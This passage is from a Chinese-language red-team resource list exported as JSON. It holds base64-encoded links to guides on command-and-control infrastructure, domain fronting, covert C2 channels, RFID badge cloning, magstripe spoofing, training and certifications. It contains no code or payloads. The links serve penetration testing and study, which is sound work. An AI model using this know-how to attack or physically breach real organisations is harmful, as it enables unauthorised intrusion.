data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8wNi8yMy9vcHNlYy1jb25zaWRlcmF0aW9ucy1mb3ItYmVhY29uLWNvbW1hbmRzLw==\">OPSEC 有关 beacon command 的注意事项</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8xMS8wMy9hZ2VudGxlc3MtcG9zdC1leHBsb2l0YXRpb24v\">无代理载荷投递</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8xMi8xNi93aW5kb3dzLWFjY2Vzcy10b2tlbnMtYW5kLWFsdGVybmF0ZS1jcmVkZW50aWFscy8=\">Windows 访问令牌与备用凭据</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pcm9uZ2Vlay5jb20vaS5waHA/cGFnZT12aWRlb3MvZGVyYnljb243L3QxMDQtcHNhbXNpLWFuLW9mZmVuc2l2ZS1wb3dlcnNoZWxsLW1vZHVsZS1mb3ItaW50ZXJhY3Rpbmctd2l0aC10aGUtYW50aS1tYWx3YXJlLXNjYW4taW50ZXJmYWNlLWluLXdpbmRvd3MtMTAtcnlhbi1jb2Ji\">PSAmsi - Windows 10 中与反恶意软件扫描接口交互的进攻性 PowerShell 模块</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3RocmVhdC50ZXZvcmEuY29tL2xheS1vZi10aGUtbGFuZC13aXRoLWJsb29kaG91bmQv\">Lay of the Land with BloodHound</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNi9icmluZ2luZy10aGUtaGFzaGVzLWhvbWUtd2l0aC1yZWdlb3JnLWVtcGlyZS8=\">使用 reGeorg 与 Empire 得到哈希</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNi9pbnRlcmNlcHRpbmctcGFzc3dvcmRzLXdpdGgtZW1waXJlLWFuZC13aW5uaW5nLw==\">使用 Empire 截取密码</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9vdXRsb29rLWhvbWUtcGFnZS1hbm90aGVyLXJ1bGVyLXZlY3Rvci8=\">Outlook 主页 – 另一个攻击向量</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZW5zZXBvc3QuY29tL2Jsb2cvMjAxNy9vdXRsb29rLWZvcm1zLWFuZC1zaGVsbHMv\">Outlook 的 Form 与 Shell</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25ldGJpb3NYL0NoZWNrbGlzdHMvYmxvYi9tYXN0ZXIvV2luZG93cy1Qcml2aWxlZ2UtRXNjYWxhdGlvbi5tZA==\">Windows 提权清单</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaWxlbnRicmVha3NlY3VyaXR5LmNvbS90aHJvd2JhY2stdGh1cnNkYXktYS1ndWlkZS10by1jb25maWd1cmluZy10aHJvd2JhY2sv\">配置回滚指南</span></li>\n</ul>\n<h2 id=\"-6\"><a class=\"anchor\" href=\"#-6\">#</a> <a href=\"#table-of-contents\">↑</a> 命令控制</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL2J1aWxkLWMyLWluZnJhc3RydWN0dXJlLWRpZ2l0YWwtb2NlYW4tcGFydC0xLw==\">使用 Digital Ocean 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNC8wOS8wOS9pbmZyYXN0cnVjdHVyZS1mb3Itb25nb2luZy1yZWQtdGVhbS1vcGVyYXRpb25zLw==\">红队行动的基础设施</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTcvMDgvYXV0b21hdGVkLXJlZC10ZWFtLWluZnJhc3RydWN0dXJlLWRlcGxveW1lbnQtd2l0aC10ZXJyYWZvcm0tLS1wYXJ0LTEv\">使用 Terraform 进行红队基础设施自动化部署</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMTEvdG9wLXJlZC10ZWFtLXRpcHMv\">6 个红队基础设施的小提示</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE3LTA1LTAyLXJlZC10ZWFtaW5nLWZvci1wYWNpZmljLXJpbS1jY2RjLTIwMTcv\">Pacific Rim CCDC 2017 中的红队</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE1LTA0LTE1LWhvdy1pLXByZXBhcmVkLXRvLXJlZC10ZWFtLWF0LXByY2NkYy0yMDE1Lw==\">在 PRCCDC 2015 中我是如何进行红队准备的？</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE2LTA1LTI0LXBhY2lmaWMtcmltLWNjZGNfMjAxNi8=\">Pacific Rim CCDC 2016 中的红队</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE3LTA4LTMwLXJhbmRvbWl6ZWQtbWFsbGVhYmxlLWMyLXByb2ZpbGVzLW1hZGUtZWFzeS8=\">随机化 Malleable 的 C2 配置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE2LTA2LTI4LWNvYmFsdC1zdHJpa2UtaHR0cC1jMi1yZWRpcmVjdG9ycy13aXRoLWFwYWNoZS1tb2RfcmV3cml0ZS8=\">使用 Apache 和 mod_rewrite 重定向 Cobalt Strike 的 HTTP C2 - Jeff Dimmock</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8wMi8wNi9oaWdoLXJlcHV0YXRpb24tcmVkaXJlY3RvcnMtYW5kLWRvbWFpbi1mcm9udGluZy8=\">高信誉的重定向与域名前置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wMi90b3ItZnJvbnRpbmctdXRpbGlzaW5nLWhpZGRlbi1zZXJ2aWNlcy1mb3ItcHJpdmFjeS8=\">TOR Fronting – 利用隐藏服务保护隐私</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wMi9kb21haW4tZnJvbnRpbmctdmlhLWNsb3VkZnJvbnQtYWx0ZXJuYXRlLWRvbWFpbnMv\">通过 Cloudfront Alternate Domains 部署域名前置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVkdGVhbXNlY3VyZS5jb20vdGhlLXBsdWdib3QtaGFyZHdhcmUtYm90bmV0LXJlc2VhcmNoLXByb2plY3Qv\">PlugBot: 硬件僵尸网络研究项目</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2F0dGFjay1pbmZyYXN0cnVjdHVyZS1sb2ctYWdncmVnYXRpb24tYW5kLW1vbml0b3JpbmctMzQ1ZTQxNzMwNDRl\">攻击基础设施日志聚合与监视</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3J2cnNoM2xsL0ZpbmRGcm9udGFibGVEb21haW5z\">发现前置域名</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL24wcGUtc2xlZC9BcGFjaGUyLU1vZC1SZXdyaXRlLVNldHVw\">安装 Apache2Mod Rewrite</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueG9ycmlvci5jb20vRW1waXJlLURvbWFpbi1Gcm9udGluZy8=\">Empre 域名前置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pbmlzbGxjL2RvbWFpbmh1bnRlcg==\">域名猎手</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8xMC8yMS9taWdyYXRpbmcteW91ci1pbmZyYXN0cnVjdHVyZS8=\">迁移您的基础设施</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ydnJzaDNsbC5uZXQvYmxvZy9vZmZlbnNpdmUvcmVkaXJlY3RpbmctY29iYWx0LXN0cmlrZS1kbnMtYmVhY29ucy8=\">重定向 Cobalt Strike 的 DNS Beacon</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGVvYnNpZGlhbnRvd2VyLmNvbS8yMDE3LzA3LzI0L2QwYTdjZmNlZWRjNDJiZGYzYTM2ZjI5MjZiZDUyODYzZWYyOGJlZmMuaHRtbA==\">发现 Azure 中的前置域名 - thoth / Fionnbharr (@a_profligate)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3liZXJhcmsuY29tL3RocmVhdC1yZXNlYXJjaC1ibG9nL3JlZC10ZWFtLWluc2lnaHRzLWh0dHBzLWRvbWFpbi1mcm9udGluZy1nb29nbGUtaG9zdHMtdXNpbmctY29iYWx0LXN0cmlrZS8=\">对 Google Host 中的 HTTPS 域名前置的红队洞察</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3B0aXYuY29tL2Jsb2cvZXNjYXBlLWFuZC1ldmFzaW9uLWVncmVzc2luZy1yZXN0cmljdGVkLW5ldHdvcmtz\">逃出出口受限网络 - Tom Steele and Chris Patten</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL3Bvd2Vyc2hlbGwvY29tbWFuZC1hbmQtY29udHJvbC11c2luZy1hY3RpdmUtZGlyZWN0b3J5Lw==\">使用 Active Directory 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8yNi9jb21tYW5kLWFuZC1jb250cm9sLXR3aXR0ZXIv\">使用 Twitter 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8wNi9jb21tYW5kLWFuZC1jb250cm9sLWRucy8=\">使用 DNS 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wNy8yOC9jb21tYW5kLWFuZC1jb250cm9sLWljbXAv\">使用 ICMP 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOC8yOS9jb21tYW5kLWFuZC1jb250cm9sLWRyb3Bib3gv\">使用 Dropbox 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8xMC8wNC9jb21tYW5kLWFuZC1jb250cm9sLWh0dHBzLw==\">使用 HTTPS 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8xMi9jb21tYW5kLWFuZC1jb250cm9sLXdlYmRhdi8=\">使用 webdav 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOC8wMy9jb21tYW5kLWFuZC1jb250cm9sLWdtYWlsLw==\">使用 Gmail 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy90YXNraW5nLW9mZmljZS0zNjUtZm9yLWNvYmFsdC1zdHJpa2UtYzIv\">使用 Office 365 的任务用于 Cobalt Strike 的 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHlhcnR3b3JrLmVzLzIwMTcvMDEvMzEvc2ltcGxlLWRvbWFpbi1mcm9udGluZy1wb2Mtd2l0aC1nYWUtYzItc2VydmVyLw==\">GAE C2 服务器简单域名前置 PoC</span></li>\n</ul>\n<h2 id=\"-7\"><a class=\"anchor\" href=\"#-7\">#</a> <a href=\"#table-of-contents\">↑</a> 嵌入式与物理设备</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJ1c3R3YXZlLmNvbS9SZXNvdXJjZXMvU3BpZGVyTGFicy1CbG9nL0dldHRpbmctaW4td2l0aC10aGUtUHJveG1hcmstMy1hbmQtUHJveEJydXRlLw==\">从 Proxmark3 与 ProxBrute 开始</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm52aXNvLmJlLzIwMTcvMDEvMTEvYS1wcmFjdGljYWwtZ3VpZGUtdG8tcmZpZC1iYWRnZS1jb3B5aW5nLw==\">RFID Badge 复制实用指南</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHVubmVsc3VwLmNvbS9jb250ZW50cy1vZi1hLXBoeXNpY2FsLXBlbi10ZXN0ZXJzLWJhY2twYWNrLw==\">一个物理渗透测试人员的背包</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NhbXlrL21hZ3Nwb29m\">MagSpoof - 信用卡 / 磁条卡伪造</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYW15LnBsL2tleXN3ZWVwZXIv\">无线键盘嗅探器</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmtjaHVuZy5jby9yZmlkLWhhY2tpbmctd2l0aC10aGUtcHJveG1hcmstMy8=\">使用 Proxmark 3 进行 RFID 入侵</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MuYmhhbS5hYy51ay9+Z2FyY2lhZi9wdWJsaWNhdGlvbnMvVHV0b3JpYWxfUHJveG1hcmtfdGhlX1N3aXNzX0FybXlfS25pZmVfZm9yX1JGSURfU2VjdXJpdHlfUmVzZWFyY2gtUkZJRFNlYzEyLnBkZg==\">RFID 的瑞士军刀</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vYmgtdXMtMTIvQnJpZWZpbmdzL0NfTWlsbGVyL0JIX1VTXzEyX01pbGxlcl9ORkNfYXR0YWNrX3N1cmZhY2VfV1AucGRm\">探索 NFC 的攻击面</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2dlcmhhcmQuZGVrb25pbmdnYW5zLm5sL2RvY3VtZW50cy9wdWJsaWNhdGlvbnMvZGVrb25pbmdnYW5zLnBoZC50aGVzaXMucGRm\">智能卡</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmtjaHVuZy5jby9yZXZlcnNlLWVuZ2luZWVyaW5nLWhpZC1pY2xhc3MtbWFzdGVyLWtleXMv\">逆向 HID iClass 的主密钥</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucHduaWVleHByZXNzLmNvbS9hb3Bw\">Android Open Pwn Project (AOPP)</span></li>\n</ul>\n<h2 id=\"-8\"><a class=\"anchor\" href=\"#-8\">#</a> <a href=\"#table-of-contents\">↑</a> 杂项</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL1JlZFRpcHM=\">Vysec 的红队技巧</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8wMi8yMy9jb2JhbHQtc3RyaWtlLXRpcHMtZm9yLTIwMTYtY2NkYy1yZWQtdGVhbXMv\">Cobalt Strike 红队技巧 - 2016</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wNy8wOS9tb2RlbHMtZm9yLXJlZC10ZWFtLW9wZXJhdGlvbnMv\">红队行动模型</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hZ29vL3JlZHRlYW0tcGxhbg==\">红队实践计划</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vY2xiYnF2YXdRZw==\">Raphael Mudge - 肮脏的红队技巧</span></li>\n</ul>\n<h2 id=\"-9\"><a class=\"anchor\" href=\"#-9\">#</a> <a href=\"#table-of-contents\">↑</a> 电子书籍</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9OZXh0LUdlbmVyYXRpb24tVGVhbWluZy1IZW5yeS1EYWx6aWVsL2RwLzAxMjgwNDE3MTQ=\">下一代红队行动</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9UYXJnZXRlZC1DeWJlci1BdHRhY2tzLU11bHRpLXN0YWdlZC1FeHBsb2l0cy9kcC8wMTI4MDA2MDQ4\">针对性网络攻击</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9BZHZhbmNlZC1QZW5ldHJhdGlvbi1UZXN0aW5nLUhhY2tpbmctTmV0d29ya3MvZHAvMTExOTM2NzY4OQ==\">高级渗透测试：入侵全球最安全的网络</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9Tb2NpYWwtRW5naW5lZXJzLVBsYXlib29rLVByYWN0aWNhbC1QcmV0ZXh0aW5nL2RwLzA2OTIzMDY2MTcvcmVmPWFzX2xpX3NzX3RsP2llPVVURjgmYW1wO2xpbmtDb2RlPXNsMSZhbXA7dGFnPXRhbGFtYW50ZXN1cy0yMCZhbXA7bGlua0lkPTM3YjYzYzc3MDJjOWJlNmI5ZjZhMWI5MjFjODhjOGNk\">社会工程的手边书</span></li>\n</ul>\n<h2 id=\"-10\"><a class=\"anchor\" href=\"#-10\">#</a> <a href=\"#table-of-contents\">↑</a> 培训（免费）</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1JUnBTN29aM3owbyZhbXA7bGlzdD1QTDlITzZNX01VMm5lc3hTbWhKakV2d0xoVW9IUEhtWHZ6\">Tradecraft - 关于红队行动的课程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wOS8zMC9hZHZhbmNlZC10aHJlYXQtdGFjdGljcy1jb3Vyc2UtYW5kLW5vdGVzLw==\">高级威胁战术课程与笔记</span></li>\n</ul>\n<h2 id=\"-11\"><a class=\"anchor\" href=\"#-11\">#</a> <a href=\"#table-of-contents\">↑</a> 认证</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jcmVzdC1hcHByb3ZlZC5vcmcvZXhhbWluYXRpb24vY2VydGlmaWVkLXNpbXVsYXRlZC1hdHRhY2stc3BlY2lhbGlzdC8=\">CREST 模拟攻击专家</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jcmVzdC1hcHByb3ZlZC5vcmcvZXhhbWluYXRpb24vY2VydGlmaWVkLXNpbXVsYXRlZC1hdHRhY2stbWFuYWdlci8=\">CREST 模拟攻击管理员</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2Fucy5vcmcvY291cnNlL3JlZC10ZWFtLW9wZXJhdGlvbnMtYW5kLXRocmVhdC1lbXVsYXRpb24=\">SEC564: 红队行动与威胁仿真</span></li>\n</ul>\n",
            "tags": [
                "RedTeam"
            ]
        }
    ]
}